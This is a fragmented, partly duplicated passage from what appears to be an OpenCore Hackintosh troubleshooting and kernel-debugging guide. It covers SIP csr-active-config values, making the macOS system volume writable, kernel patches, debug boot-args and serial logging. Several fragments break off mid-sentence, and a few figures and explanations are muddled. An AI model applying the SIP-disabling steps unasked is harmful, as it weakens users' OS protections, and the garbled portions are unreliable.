SIP outright to avoid these issues.\n   * Enabling CSR_ALLOW_UNAUTHENTICATED_ROOT and CSR_ALLOW_APPLE_INTERNAL are common options that can break OS updates for users\n\nYou can choose different values to enable or disable certain flags of SIP. Some useful tools to help you with these are BitmaskDecode and csrstat. Common values are as follows (bytes are pre-hex swapped for you, and note that they go under NVRAM -> Add -> 7C436110-AB2A-4BBB-A880-FE41995C9F82 -> csr-active-config):\n\n * 00000000 - SIP completely enabled (0x0).\n * 03000000 - Disable kext signing (0x1) and filesystem protections (0x2).\n * FF030000 - Disable all flags in macOS High Sierra (0x3ff).\n * FF070000 - Disable all flags in macOS Mojave and in macOS Catalina (0x7ff) as Apple introduced a value for executable policy.\n * FF0F0000 - Disable all flags in macOS Big Sur (0xfff) which has another new flag for authenticated root.\n\nNote: Disabling SIP with OpenCore is quite a bit different compared to Clover, specifically that NVRAM variables will not be overwritten unless explicitly told so under the Delete section. So if you've already set SIP once either via OpenCore or in macOS, you must override the variable:\n\n * NVRAM -> Delete -> 7C436110-AB2A-4BBB-A880-FE41995C9F82 -> csr-active-config\n\n\n\n\n# Writing to the macOS system partition\n\nWith macOS Catalina and newer, Apple split the OS and user data into 2 volumes where the system volume is read-only by default. To make these drives writable we'll need to do a few things:\n\n * Note: Users of SecureBootModel may end up in a RecoveryOS boot loop if the system partition has been modified. To resolve this, Reset NVRAM and set SecureBootModel to Disabled\n\nmacOS Catalina\n\n 1. Disable SIP\n 2. Mount drive as writable (Run sudo mount -uw / in terminal)\n\nmacOS Big Sur\n\n 1. Disable SIP\n 2. Mount drive as writable (See below link for command)\n\n * Note: Due to how OS updates work in macOS Big Sur and newer, changing the system volume can in fact break OS updates.

synaptics ps2 based trackpad doesn't work\n\nyou can try to use ssdt-enable_dynamicewmode.dsl. first, you have to open device manager, and head to the following:\n\ndevice manager -> mice and other pointing devices -> double click on your trackpad -> properties -> details > bios device name\n\n\nthen grab ssdt-enable_dynamicewmode.dsl by default, this uses pci0.lpcb.ps2k for the pathing. you'll want to rename accordingly.\n\nexternal (_sb_.pci0.lpcb.ps2k, deviceobj) <- rename this\n\n    name(_sb.pci0.lpcb.ps2k.rmcf, package()  <- rename this\n\n\n\nthen compile with maciasl, copy to your

buttons (more details). if you can live without the trackpad, this may be better:\n\nfind the acpi path of your mouse (see above), then grab ssdt-disabletrackpadprobe.dsl. by default, this uses pci0.lpcb.ps2k so you have to change that to your acpi path if necessary:\n\nexternal (_sb_.pci0.lpcb.ps2k, deviceobj) <- rename this\n\n    name(_sb.pci0.lpcb.ps2k.rmcf, package() <- rename this\n\n\n\n# fix for dell breakless ps2 keyboard keys\n\nfor those with issues surrounding key presses not releasing(ie. pressing infinitely), you'll want to enable voodoops2's dell profile.\n\nfirst

forcing pcie 3.0 link speed\n\n\n# drm broken\n\nrefer to fixing drm section\n\n\n# \"memory modules misconfigured\" on macpro7,1\n\nfollow guide listed here:\n\n * fixing macpro7,1 memory errors\n\nfor those who simply want to disable the notification(not the error itself) is more than enough. for these users, we recommend installing restrictevents\n\n\n# apps crashing on amd\n\neasy fix, buy intel\n\nso with amd, whenever apple calls cpu specific functions the app will either not work or outright crash. here are some apps and their \"fixes\":\n\n * adobe products don't always work\n   * some fixes can be found here: adobe fixes\n   * do note these fixes just disables functionality, they're not really fixes\n * virtual machine running off of applehv's framework will not work(ie: parallels 15, vmware)\n   * virtualbox works fine as it doesn't use applehv\n   * vmware 10 and older can work as well\n   * parallels 13.1.0 and older are known to work as well\n * docker broken\n   * docker toolbox is the only solution as it's based off of virtualbox, many features are unavailable with this version\n * ida pro won't install\n   * there's an intel specific check in the installer, app itself is likely fine\n * 15/16h cpu web pages crashing\n   * follow directions here after update 5: fix web pages\n\n\n# sleep crashing on amd\n\nthis is generally seen on amd who use the chipset's usb controller, specifically for the ryzen series and newer. the main way to tell if you're having issues with this is checking logs after either sleeping or waking:\n\n * in terminal:\n   * log show --last 1d | grep -i \"wake reason\"\n\nshould result in something like this:\n\nsleep transition timed out after 180 seconds while calling power state change callbacks. suspected bundle: com.apple.iokit.iousbhostfamily.\n\n\nyou can double check which controller is xhc0 via ioreg and checking the vendor id(1022 for amd chipset). the fix for this sleep issue is either:\n\n * avoid the chipset usb all together(ideally set _sta = 0x0 to disable the controller outright with an ssdt)\n * correct the usbx power properties to what the controller expects\n\n\n# assetcache content caching unavailable in virtual machine\n\nerrors such as:\n\n$ sudo assetcachemanagerutil activate\nassetcachemanagerutil[] failed to activate content caching: error domain=acsmerrordomain code=5 \"virtual machine\"...\n\n\narise due to vmm flag being exposed by sysctl.\n\napply vmassetcacheenable kernel patch to disguise the flag and allow normal operation.\n\n\n# coffee lake systems failing to wake\n\nin macos 10.15.4, there were some changes made to agpm that can cause wake issues on coffee lake systems. specifically displays hooked up to the igpu would fail to wake. to resolve this:\n\n * add igfxonln=1 to boot-args\n * make sure you're using whatevergreen v1.3.8 or newer\n\n\n# no brightness control on dual gpu laptops\n\nin macos 11.3, there were some changes made to backlight controlling mechanisms that defaults the backlight to be controlled by the dgpu on dual gpu laptops with mux enabled. optimus only laptops, however, are not affected, since you need to disable the dgpu anyways. specifically, this problem only causes issues if you have a dual gpu laptop with the internal screen from an igpu output and external screens from dgpu outputs (hybrid mode on some mobile workstations). to resolve this, you may disable either the igpu or the dgpu, or do the following:\n\n * verify ssdt-pnlf is installed(ie. efi/oc/acpi as well as config.plist -> acpi -> add)\n\n * add below to pciroot(0x0)/pci(0x2,0x0):\n\n@0,backlight-control | data | 01000000\n\napplbkl | data | 01000000\n\naapl,backlight-control | data | 01000000\n\naapl00,backlight-control | data | 01000000\n\n * add below to your dgpu pci address:\n\n@0,backlight-control | data | 00000000\n\napplbkl | data | 00000000\n\naapl,backlight-control | data | 00000000\n\n\n# no temperature/fan sensor output\n\nso couple things:\n\n * istat menus doesn't yet support macpro7,1 readouts\n * virtualsmc's bundled sensors do not support amd\n\nfor istat, you'll have to wait for an update. for amd users, you can use either:\n\n * smcamdprocessor\n   * still in early beta but great work has been done, note it's been mainly tested on ryzen\n * fakesmc3_with_plugins\n\nnote for amd with fakesmc:\n\n * filevault support requires more work with fakesmc\n * make sure no other smc kexts are present, specifically those from virtualsmc\n\n\n# \"you can't change the startup disk to the selected disk\" error\n\nthis is commonly caused by irregular partition setup of the windows drive, specifically that the efi is not the first partition. to fix this, we need to enable this quirk:\n\n * platforminfo -> generic -> advisefeatures -> true\n\n\n\n\n# selecting startup disk doesn't apply correctly\n\nif you're having issues with startup disk correctly applying your new boot entry, this is most likely caused by a missing devicepathssupported in your i/o registry. to resolve this, ensure you are using platforminfo -> automatic -> true\n\nexample of missing devicepathssupported:\n\n * default devicepath match failure due to different pciroot #664\n\n\n# macos waking up with the wrong time\n\nan odd quirk some people may notice is that from wake, macos will have the incorrect time for a bit before self-correcting with network time check. the root cause of this issue is most likely due to your rtc not ticking, and can be resolved with a new cmos battery(note that z270 and newer are quite picky with voltage so choose carefully).\n\nto verify whether your rtc is working correctly:\n\n * download virtualsmc v1.1.5+ and run the smcread tool:\n\n/path/to/smcread -s | grep clkt\n\n\n\n\nthis should provide you with a hexadecimal value, and once converted it should equal time elapsed from midnight relative to cupertino.\n\nso for this example, we'll grab our value(00010d13) then convert it to decimal and finally divide it by 3600. this should result in the approximate time elapsed(in seconds) since midnight relative to cupertino\n\n * 00010d13 (convert to hex)-> 68883 (divided by 3600 so we get hours)-> 19.13h(so 19:07:48)\n\nnext you'll want to put your hack to sleep for a bit and wake it, then check the clkt value once more to see whether it deviated more or if it has a set difference. if you find it didn't actually tick much of at all from the elapsed time, you'll need to look into buying a new battery(with proper voltage)\n\n\n# no volume/brightness control on external monitors\n\noddly enough, macos has locked down digital audio from having control. to bring back some functionality, the app monitorcontrol has done great work on improving support in macos\n\n\n# time inconsistency between macos and windows\n\nthis is due to macos using universal time while windows relies on greenwich time, so you'll need to force one os to a different way of measuring time. we highly recommend modifying windows instead as it's far less destructive and painful:\n\n * install bootcamp utilities\n * modify windows' registry\n\n\n# disabling sip\n\nsip or more properly known as system integrity protection, is a security technology that attempts to prevent any malicious software and the end user from damaging the os. first introduced with os x el capitan, sip has grown over time to control more and more things in macos, including limiting edits to restricted file locations and 3rd party kext loading with kextload(opencore is unaffected as kexts are injected at boot). to resolve this, apple has provided numerous configuration options in the nvram variable csr-active-config which can either be set in the macos recovery environment or with opencore's nvram section(the latter will be discussed below).\n\n * warning: disabling sip can break os functionality such as software updates in macos 11, big sur and newer. please be careful to only disable specific sip values instead of disabling sip outright to avoid these issues.\n   * enabling csr_allow_unauthenticated_root and csr_allow_apple_internal are common options that can break os updates for users\n\nyou can choose different values to enable or disable certain flags of sip. some useful tools to help you with these are bitmaskdecode and csrstat. common values are as follows (bytes are pre-hex swapped for you, and note that they go under nvram -> add -> 7c436110-ab2a-4bbb-a880-fe41995c9f82 -> csr-active-config):\n\n * 00000000 - sip completely enabled (0x0).\n * 03000000 - disable kext signing (0x1) and filesystem protections (0x2).\n * ff030000 - disable all flags in macos high sierra (0x3ff).\n * ff070000 - disable all flags in macos mojave and in macos catalina (0x7ff) as apple introduced a value for executable policy.\n * ff0f0000 - disable all flags in macos big sur (0xfff) which has another new flag for authenticated root.\n\nnote: disabling sip with opencore is quite a bit different compared to clover, specifically that nvram variables will not be overwritten unless explicitly told so under the delete section. so if you've already set sip once either via opencore or in macos, you must override the variable:\n\n * nvram -> delete -> 7c436110-ab2a-4bbb-a880-fe41995c9f82 -> csr-active-config\n\n\n\n\n# writing to the macos system partition\n\nwith macos catalina and newer, apple split the os and user data into 2 volumes where the system volume is read-only by default. to make these drives writable we'll need to do a few things:\n\n * note: users of securebootmodel may end up in a recoveryos boot loop if the system partition has been modified. to resolve this, reset nvram and set securebootmodel to disabled\n\nmacos catalina\n\n 1. disable sip\n 2. mount drive as writable (run sudo mount -uw / in terminal)\n\nmacos big sur\n\n 1. disable sip\n 2. mount drive as writable (see below link for command)\n\n * note: due to how os updates work in macos big sur and newer, changing the system volume can in fact break os updates. please edit with caution\n\ncommands based off of apple's kdk documents:\n\n# first, create a mount point for your drive\nmkdir ~/livemount\n\n# next, find your system volume\ndiskutil list\n\n# from the below list, we can see our system volume is disk5s5\n/dev/disk5 (synthesized):\n

broken seal. thanks to new snapshots being created with every os update, we've got quite a bit to roll back too.\n\nto roll back, you'll first need to reboot into recovery partition then select

newer, 64mb is expected to be allocated\n   * machines relying on whatevergreen's framebuffer-stolenmem property should know this can cause 4k output issues. please ensure you can set the igpu's

To get around this you have 2 way to go:\n\n * Expand the EFI of the drive to 200MB(See Google on how)\n * Format the entire drive instead of just the partition\n   * Note by default Disk Utility only shows partitions, press Cmd/Win+2 to show all devices(Alternatively you can press the view button)\n\nDEFAULT   SHOW ALL DEVICES(CMD+2)\n          \n\n\n# DiskUtility failing to erase\n\nThis is either 1(or more) of 5 issues:\n\n * Formatting partition and not the drive, see MediaKit reports not enough space\n * DiskUtility has an odd bug where it will fail on first erase, try erasing again\n * SATA Hot-plug support in the BIOS is causing issues(try disabling this option)\n * Old firmware, make sure the drive is on the latest firmware\n * And finally, you may just have a bad drive\n\n\n# SATA Drives Not Shown in DiskUtility\n\n * Make sure SATA Mode is AHCI in bios\n * Certain SATA controllers may not be officially supported by macOS, for these cases you'll want to grab CtlnaAHCIPort.kext\n   * For very legacy SATA controllers, AHCIPortInjector.kext may be more suitable.\n\n\n# Stuck at 2 minutes remaining\n\n\n\nThis error is directly related to the stage at which macOS will write certain NVRAM variables for your system to boot next, and so when there's issues revolving around NVRAM it'll stall here.\n\nTo resolve, we have a few options:\n\n * 300 series Intel Fix(ie. Z390):\n   * SSDT-PMC\n * Others can set the following in their config.plist:\n   * LegacyEnable -> YES\n   * LegacyOverwrite -> YES\n   * WriteFlash -> YES\n\n\n# The recovery server cannot get contacted\n\nIf you made your installer in Windows or Linux, then this means your USB installer is recovery based. What this means is that only a small portion of the macOS installer is on disk while the rest must be downloaded from Apple servers in the installer. And reason we do not include full installer guides is due to unstable HFS drivers and other utilities that commonly end up with data corruption.\n\nTo resolve the error, you have a few options:\n\n * Ensure you have a working Ethernet or WiFi connection\n   * Open Network Utility under Utilties header in the installer and see if your Network Card shows up\n     * If you network card doesn't show up, it's likely you're missing the right Network kext\n       * Please refer here: Ethernet Kexts and Finding your hardware\n     * If the network card does show up, next run ping -c3 www.google.com in the installer's terminal to ensure your network connection is working\n       * If nothing shows, either your network or kexts are acting up\n         * We recommend trying older variants of kexts in cases where newer builds have weird bugs with your hardware\n       * If it does return something, then the issue is on Apple's end. You'll simply need to try to install again another time unfortunately\n\nCHECK NIC   PING\n            \n\n\n# Keyboard and Mouse broken in Big Sur\n\nFor certain legacy systems(ie. Core2 Duo/2010 and older), you may notice that while the USB ports work your HID-based devices such as the keyboard and mouse may be broken. To resolve this, add the following patch:\n\nIOHIDFamily Patch\n\nconfig.plist -> Kernel -> Patch:\n\nKEY           TYPE      VALUE\nBase          String    _isSingleUser\nCount         Integer   1\nEnabled       Boolean   True\nFind          Data      \nIdentifier    String    com.apple.iokit.IOHIDFamily\nLimit         Integer   0\nMask          Data      \nMaxKernel     String    \nMinKernel     String    20.0.0\nReplace       Data      B801000000C3\nReplaceMask   Data      \nSkip          Integer   0\n\nSource\n\n\n# Stuck on Your Mac needs a firmware update in order to install to this volume\n\nIf you're being prompted to update your firmware to install with an APFS volume, this likely indicates an outdated SMBIOS table. First, verify the following:\n\n * You have PlatformInfo -> Automatic enabled\n * UpdateSMBIOSMode is set to Create\n   * Make sure CustomSMBIOSGuid is disabled\n   * For Dell and VAIO machines, ensure that CustomSMBIOSGuid is enabled and UpdateSMBIOSMode is set to Custom instead\n     * CustomSMBIOSGuid and UpdateSMBIOSMode should always be in tandem with each other\n * Using a SMBIOS supported in this version of macOS\n   * ie. you're not using -no_compat_check\n * You're using the latest version of OpenCore\n\nIf you still receive this error, then there's likely some outdated SMBIOS info in OpenCore itself. We recommend changing to a similar SMBIOS and see if this is resolved.

Main things we recommend are DEBUG version of OpenCore and all your kexts. This can help ensure you get all the necessary data, see here for more details on OpenCore debugging: OpenCore debugging\n\nBesides just using DEBUG variants of OpenCore and kexts, these tools can also help out greatly:\n\n * DebugEnhancer.kext\n   \n   * Helps greatly with kernel debugging while also patching kern.msgbuf to 10485760 and allowing a much larger kernel-log.\n   * Note this kext cannot start with kernel initialization, so early logs are not patched until the kext is loaded right before PCI Configuration Stage\n\n * SSDT-DBG\n   \n   * Enables debug statements from your ACPI tables, helping for in-OS ACPI event debugging\n   * Note you will need to compile the SSDT\n\n\n# Config.plist Setup\n\nFor serial setup, OpenCore actually makes this quite straight forward.\n\n\n# Misc\n\n# Serial\n\n * Init: YES\n   * Initializes the serial port from OpenCore\n   * Needed for sending OpenCore logging to the serial port\n\n# Debug\n\n * Target: 67\n   * Enables debug output with OpenCore\n   * Target = 75 adds the additional serial output flag(0x08) if you plan to use serial\n   * You can calculate your own value here: OpenCore debugging\n\n\n# NVRAM\n\n# boot-args\n\nHere we get to set some variables that will help us with debug output, for us we'll be using the following boot-args:\n\n-v keepsyms=1 debug=0x12a msgbuf=1048576\n\n\nNow lets go over what each arg does:\n\n * -v\n   * Enables verbose output\n * keepsyms=1\n   * Ensures symbols are kept during kernel panics, which are greatly helpful for troubleshooting\n * debug=0x12a\n   * Combination of DB_PRT (0x2), DB_KPRT (0x8), DB_SLOG (0x20), and DB_LOG_PI_SCRN (0x100)\n   * A full list of values for the latest version of XNU can be found here: debug.h\n * msgbuf=1048576\n   * Sets the kernel's message buffer size, this helps with getting proper logs during boot\n   * 1048576 is 1MB(/1024^2), can be larger if required\n   * Note not required with DebugEnhancer.kext, however for early kernel logs it's still required\n\nOther helpful boot-args:\n\nDepending on what you're debugging, you may also find these boot-args extremely helpful:\n\n * -liludbgall\n   * Enables debugging on Lilu and any other plugins, though note that this requires DEBUG versions of the kexts\n * io=0xff\n   * Enables IOKit debugging, with greater output. Be aware that the logging-amount of this parameter will be huge and will slow down the system. Especially while booting.\n * igdebug=0xff\n   * Enables iGPU related debugging, helpful when working with iGPU systems\n * serial=5\n   * Redirects output to serial if you plan to use serial\n   * Recommended for early kernel output before PCI Configuration\n * acpi_layer=0x8\n   * Enables ACPI_TABLES debug, see acoutput.h for more information\n   * 0xFFFFFFFF alternatively enables all layers\n * acpi_level=0x2\n   * Sets ACPI_LV_DEBUG_OBJECT debug, see acoutput.h for more information\n   * 0xFFFF5F alternatively implies ACPI_ALL_COMPONENTS\n\n\n# Serial Setup(Optional)\n\n * Hardware Setup\n * EFI Setup\n * Config.plist Setup\n\nWhile optional, serial can be super helpful in grabbing all the important info flooding your PC. It's also the only way to properly log super early kernel panics(such as things right after [EB|#LOG:EXITBS:START])\n\nFor this setup, you'll need a few things:\n\n * A serial header/port on the test machine\n * A serial-to-serial or serial-to-USB cable\n * A second machine to receive the serial logging(with either Serial or USB)\n * Software to monitor the serial output\n   * For this guide, we'll use CoolTerm as it supports macOS, Linux, Windows and even Raspberry Pi's\n   * screen and other methods are also supported\n\n\n# Hardware Setup\n\nFor this example, we'll be using an Asus X299-E Strix board which does have a serial header. To verify whether your board comes with one, check the owners or service manual and search for the serial/COM port:\n\n\n\nAs you can see, we have a COM port on the bottom of our motherboard and even provides us with a diagram for manually hooking up our serial pins if you're not using a 9/10 Pin Serial Header to DB9 adapter.\n\nAlternatively, some machine come with DB9 Serial ports right on the rear IO such as this Dell Optiplex 780 SFF(note that VGA and Serial are not the same connector):\n\nFor my X299 setup, I'm using a simple Serial header to DB9, then a DB9 to USB RS 232 adapter which finally terminates at my laptop:\n\nSERIAL HEADER TO DB9   DB9 TO USB RS 232 ADAPTER\n                       \n\nThe OpenCore manual generally recommends CP21202-based UART devices:\n\n> To obtain the log during boot you can make the use of serial port debugging. Serial port debugging is enabled in Target, e.g. 0xB for onscreen with serial. OpenCore uses 115200 baud rate, 8 data bits, no parity, and 1 stop bit. For macOS your best choice are CP2102-based UART devices. Connect motherboard TX to USB UART RX, and motherboard GND to USB UART GND. Use screen utility to get the output, or download GUI software, such as CoolTerm. Note: On several motherboards (and possibly USB UART dongles) PIN naming may be incorrect. It is very common to have GND swapped with RX, thus you have to connect motherboard “TX” to USB UART GND, and motherboard “GND” to USB UART RX.\n\nImportant reminder: Don't forget to also enable the serial port in your BIOS, most motherboards will disable it by default\n\n\n# CoolTerm Setup\n\nNow lets fire up CoolTerm and set a few options. When you open CoolTerm, you'll likely be greeted with a simple window. Here select the Options entry:\n\n\n\nHere we're given quite a few options, but the mains ones we care about are:\n\n * Port: Ensure this matches with your serial controller.\n * Baudrate = 115200\n * Data Bits = 8\n * Parity = none\n * Stop Bit = 1\n\nNext save these settings, and select the Connect entry. This will provide you a live log from serial:\n\n\n\nTo record, simply head to Connections -> Capture to Text/Binary File -> Start...(Cmd+R):\n\n\n\n\n# Kernel Debug Kits (Optional)\n\n * KDK on an Installed OS\n * Uninstalling the KDK\n\nKernel Debug Kits(KDKs) are a great way to get even more logging information from the kernel and core kexts, KDKs specifically are debug versions of macOS's core foundation provided from Apple themselves. They include both more logging as well as ASSERTs allowing you to more directly see issues with your setup. Note however we will not be discussing bridged debugging or lldb usage.\n\nCAUTION: Installing KDKs on work machines can lead to issues with OS updates as well as bricked installs. Please debug on dedicated macOS installs to avoid data loss\n\nTo start, we'll first need a minimum of a free developer account from Apple. Once you've signed up for a minimum of a free tier, you can now access KDKs from the More Downloads page:\n\n * Note: Free tiers will be limited to release KDKs, only beta KDKs are provided for paid developer accounts\n * Note 2: Apple hosts KDKs as far back as OS X 10.5, Leopard so don't worry about your OS not being supported\n\n\n\nTo determine which KDK build you need with beta builds, run the following in terminal:\n\nsw_vers | grep BuildVersion\n\n\nFor this, I will be downloading Kernel Debug Kit 11.3 build 20E5186d. Once downloaded, mount the disk image and you'll find the KDK installer. By default, the KDK will only install itself for \"Performing Two-Machine Debugging\" and will provide zero extra benefit on the host machine for kernel debugging by default.\n\n\n# KDK on an Installed OS\n\nTo enable debugging on the host machine, you'll need to do the following:\n\n 1. Run the KDK Install pkg\n 2. Disable SIP(OS X 10.11+)\n 3. Mount root partition as writable(macOS 10.15+)\n 4. Install debug kernel and kexts\n 5. Update boot-args\n 6. Reboot and check your work\n\n# 1. Run the KDK Install pkg\n\nSimply run the pkg as normal:\n\n\n\nOnce installed, you'll find the KDK components such as the debug kernel located at /Library/Developer/KDKs:\n\n\n\n# 2. Disabling SIP\n\n * Applicable for OS X 10.11, El Capitan and newer\n\nTo disable SIP, users have 2 choices:\n\n * Disable via Recovery\n\n * Disable via config.plist\n\nGenerally we highly recommend recovery to easily revert with NVRAM reset, however some users may require SIP to be disabled through NVRAM wipes as well.\n\nFor the former, simply reboot into macOS Recovery, open terminal and run the following:\n\ncsrutil disable\ncsrutil authenticated-root disable # Big Sur+\n\n\nReboot, and SIP will have been adjusted accordingly. You can run csrutil status in terminal to verify it worked.\n\n * CAUTION: For users relying on OpenCore's ApECID feature, please be aware this must be disabled to use the KDK.\n\n# 3. Mount root partition as writable\n\n * Applicable for macOS 10.15, Catalina and newer\n\nMounting the root volume as writable is easy, however the process is a bit long:\n\n# Big Sur+\n# First, create a mount point for your drive\nmkdir ~/livemount\n\n# Next, find your System volume\ndiskutil list\n\n# From the below list, we can see our System volume is disk5s5\n/dev/disk5 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -                      +255.7 GB   disk5\n                                 Physical Store disk4s2\n   1:                APFS Volume ⁨Big Sur HD - Data⁩       122.5 GB   disk5s1\n   2:                APFS Volume ⁨Preboot⁩                 309.4 MB   disk5s2\n   3:                APFS Volume ⁨Recovery⁩                887.8 MB   disk5s3\n   4:                APFS Volume ⁨VM⁩                      1.1 MB     disk5s4\n   5:                APFS Volume ⁨Big Sur HD⁩              16.2 GB    disk5s5\n   6:              APFS Snapshot ⁨com.apple.os.update-...⁩ 16.2 GB    disk5s5s\n\n# Mount the drive(ie. disk5s5)\nsudo mount -o nobrowse -t apfs  /dev/disk5s5 ~/livemount\n\n# Now you can freely make any edits to the System volume\n\n\n# Catalina only\nsudo mount -uw /\n\n\n# 4.

Update boot-args\n\nNow that you've finished setting up the KDK and installed it, we now need to tell boot.efi which kernel to use. You have 2 options to choose from:\n\n * kcsuffix=debug (removed with Big Sur)\n * kcsuffix=development\n * kcsuffix=kasan\n\ndevelopment arg will set the new default debug kernel in Big Sur, while kasan is a much more logging intensive kernel that incorporates AddressSanitizer.\n\nOnce you've decided which kernel is ideal for you, add the kcsuffix arg to your boot-args in your config.plist\n\n# 6. Reboot and check your work\n\nAssuming everything was done correctly, you'll now want to reboot and check that the correct kernel was booted:\n\nsysctl kern.osbuildconfig\n kern.osbuildconfig: kasan\n\n\nAnd as we can see, we're successfully booting a KASAN kernel.\n\n\n# Uninstalling the KDK\n\nUninstalling the KDK is fairly simple, however can be a bit destructive if not care.\n\n 1. Mount root partition as writable(macOS 10.15+)\n 2. Remove debug kernel and kexts\n 3. Re-enable SIP\n 4. Clean boot-args\n 5. Reboot and check your work\n\nSteps:\n\n# 1.

specifically focusing on more low level debugging with proper debug output and optional serial setup.\n\nnote: 99% of users do not need this level of debugging, this is only for the hardcore or extreme edge-cases.\n\n\n\n * efi setup\n * config.plist setup\n   * misc\n   * nvram\n * serial setup(optional)\n   * hardware setup\n   * coolterm setup\n * kernel debug kits (optional)\n   * kdk on an installed os\n   * uninstalling the kdk\n\n\n\n\n# efi setup\n\nfor most part, there's fairly minimal changes required. main things we recommend are debug version of opencore and all your kexts. this can help ensure you get all the necessary data, see here for more details on opencore debugging: opencore debugging\n\nbesides just using debug variants of opencore and kexts, these tools can also help out greatly:\n\n * debugenhancer.kext\n   \n   * helps greatly with kernel debugging while also patching kern.msgbuf to 10485760 and allowing a much larger kernel-log.\n   * note this kext cannot start with kernel initialization, so early logs are not patched until the kext is loaded right before pci configuration stage\n\n * ssdt-dbg\n   \n   * enables debug statements from your acpi tables, helping for in-os acpi event debugging\n   * note you will need to compile the ssdt\n\n\n# config.plist setup\n\nfor serial setup, opencore actually makes this quite straight forward.\n\n\n# misc\n\n# serial\n\n * init: yes\n   * initializes the serial port from opencore\n   * needed for sending opencore logging to the serial port\n\n# debug\n\n * target: 67\n   * enables debug output with opencore\n   * target = 75 adds the additional serial output flag(0x08) if you plan to use serial\n   * you can calculate your own value here: opencore debugging\n\n\n# nvram\n\n# boot-args\n\nhere we get to set some variables that will help us with debug output, for us we'll be using the following boot-args:\n\n-v keepsyms=1 debug=0x12a msgbuf=1048576\n\n\nnow lets go over what each arg does:\n\n * -v\n   * enables verbose output\n * keepsyms=1\n   * ensures symbols are kept during kernel panics, which are greatly helpful for troubleshooting\n * debug=0x12a\n   * combination of db_prt (0x2), db_kprt (0x8), db_slog (0x20), and db_log_pi_scrn (0x100)\n   * a full list of values for the latest version of xnu can be found here: debug.h\n * msgbuf=1048576\n   * sets the kernel's message buffer size, this helps with getting proper logs during boot\n   * 1048576 is 1mb(/1024^2), can be larger if required\n   * note not required with debugenhancer.kext, however for early kernel logs it's still required\n\nother helpful boot-args:\n\ndepending on what you're debugging, you may also find these boot-args extremely helpful:\n\n * -liludbgall\n   * enables debugging on lilu and any other plugins, though note that this requires debug versions of the kexts\n * io=0xff\n   * enables iokit debugging, with greater output. be aware that the logging-amount of this parameter will be huge and will slow down the system. especially while booting.\n * igdebug=0xff\n   * enables igpu related debugging, helpful when working with igpu systems\n * serial=5\n   * redirects output to serial if you plan to use serial\n   * recommended for early kernel output before pci configuration\n * acpi_layer=0x8\n   * enables acpi_tables debug, see acoutput.h for more information\n   * 0xffffffff alternatively enables all layers\n * acpi_level=0x2\n   * sets acpi_lv_debug_object debug, see acoutput.h for more information\n   * 0xffff5f alternatively implies acpi_all_components\n\n\n# serial setup(optional)\n\n * hardware setup\n * efi setup\n * config.plist setup\n\nwhile optional, serial can be super helpful in grabbing all the important info flooding your pc. it's also the only way to properly log super early kernel panics(such as things right after [eb|#log:exitbs:start])\n\nfor this setup, you'll need a few things:\n\n * a serial header/port on the test machine\n * a serial-to-serial or serial-to-usb cable\n * a second machine to receive the serial logging(with either serial or usb)\n * software to monitor the serial output\n   * for this guide, we'll use coolterm as it supports macos, linux, windows and even raspberry pi's\n   * screen and other methods are also supported\n\n\n# hardware setup\n\nfor this example, we'll be using an asus x299-e strix board which does have a serial header. to verify whether your board comes with one, check the owners or service manual and search for the serial/com port:\n\n\n\nas you can see, we have a com port on the bottom of our motherboard and even provides us with a diagram for manually hooking up our serial pins if you're not using a 9/10 pin serial header to db9 adapter.\n\nalternatively, some machine come with db9 serial ports right on the rear io such as this dell optiplex 780 sff(note that vga and serial are not the same connector):\n\nfor my x299 setup, i'm using a simple serial header to db9, then a db9 to usb rs 232 adapter which finally terminates at my laptop:\n\nserial header to db9   db9 to usb rs 232 adapter\n                       \n\nthe opencore manual generally recommends cp21202-based uart devices:\n\n> to obtain the log during boot you can make the use of serial port debugging. serial port debugging is enabled in target, e.g. 0xb for onscreen with serial. opencore uses 115200 baud rate, 8 data bits, no parity, and 1 stop bit. for macos your best choice are cp2102-based uart devices. connect motherboard tx to usb uart rx, and motherboard gnd to usb uart gnd. use screen utility to get the output, or download gui software, such as coolterm. note: on several motherboards (and possibly usb uart dongles) pin naming may be incorrect. it is very common to have gnd swapped with rx, thus you have to connect motherboard “tx” to usb uart gnd, and motherboard “gnd” to usb uart rx.\n\nimportant reminder: don't forget to also enable the serial port in your bios, most motherboards will disable it by default\n\n\n# coolterm setup\n\nnow lets fire up coolterm and set a few options. when you open coolterm, you'll likely be greeted with a simple window. here select the options entry:\n\n\n\nhere we're given quite a few options, but the mains ones we care about are:\n\n * port: ensure this matches with your serial controller.\n * baudrate = 115200\n * data bits = 8\n * parity = none\n * stop bit = 1\n\nnext save these settings, and select the connect entry. this will provide you a live log from serial:\n\n\n\nto record, simply head to connections -> capture to text/binary file -> start...(cmd+r):\n\n\n\n\n# kernel debug kits (optional)\n\n * kdk on an installed os\n * uninstalling the kdk\n\nkernel debug kits(kdks) are a great way to get even more logging information from the kernel and core kexts, kdks specifically are debug versions of macos's core foundation provided from apple themselves. they include both more logging as well as asserts allowing you to more directly see issues with your setup. note however we will not be discussing bridged debugging or lldb usage.\n\ncaution: installing kdks on work machines can lead to issues with os updates as well as bricked installs. please debug on dedicated macos installs to avoid data loss\n\nto start, we'll first need a minimum of a free developer account from apple. once you've signed up for a minimum of a free tier, you can now access kdks from the more downloads page:\n\n * note: free tiers will be limited to release kdks, only beta kdks are provided for paid developer accounts\n * note 2: apple hosts kdks as far back as os x 10.5, leopard so don't worry about your os not being supported\n\n\n\nto determine which kdk build you need with beta builds, run the following in terminal:\n\nsw_vers | grep buildversion\n\n\nfor this, i will be downloading kernel debug kit 11.3 build 20e5186d. once downloaded, mount the disk image and you'll find the kdk installer. by default, the kdk will only install itself for \"performing two-machine debugging\" and will provide zero extra benefit on the host machine for kernel debugging by default.\n\n\n# kdk on an installed os\n\nto enable debugging on the host machine, you'll need to do the following:\n\n 1. run the kdk install pkg\n 2. disable sip(os x 10.11+)\n 3. mount root partition as writable(macos 10.15+)\n 4. install debug kernel and kexts\n 5. update boot-args\n 6. reboot and check your work\n\n# 1. run the kdk install pkg\n\nsimply run the pkg as normal:\n\n\n\nonce installed, you'll find the kdk components such as the debug kernel located at /library/developer/kdks:\n\n\n\n# 2. disabling sip\n\n * applicable for os x 10.11, el capitan and newer\n\nto disable sip, users have 2 choices:\n\n * disable via recovery\n\n * disable via config.plist\n\ngenerally we highly recommend recovery to easily revert with nvram reset, however some users may require sip to be disabled through nvram wipes as well.\n\nfor the former, simply reboot into macos recovery, open terminal and run the following:\n\ncsrutil disable\ncsrutil

